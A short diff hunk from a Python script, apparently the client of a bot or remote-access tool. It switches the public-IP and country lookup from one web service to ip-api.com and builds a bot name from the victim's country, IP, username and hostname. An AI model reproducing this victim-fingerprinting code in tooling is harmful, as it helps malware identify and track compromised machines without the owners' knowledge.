@@ -20,8 +20,8 @@ else:
 
 os.chdir(temp)
 hostname = socket.gethostname()
-ip = requests.get("https://sheesh.rip/ip").headers['IP']
-iso = requests.get("https://sheesh.rip/ip").headers['Country']
+ip = requests.get("http://ip-api.com/line/?fields=query").text
+iso = requests.get("http://ip-api.com/line/?fields=countryCode").text
 bot_name = f"[{iso}] {ip} | {username}@{hostname}"
 
 # Bot
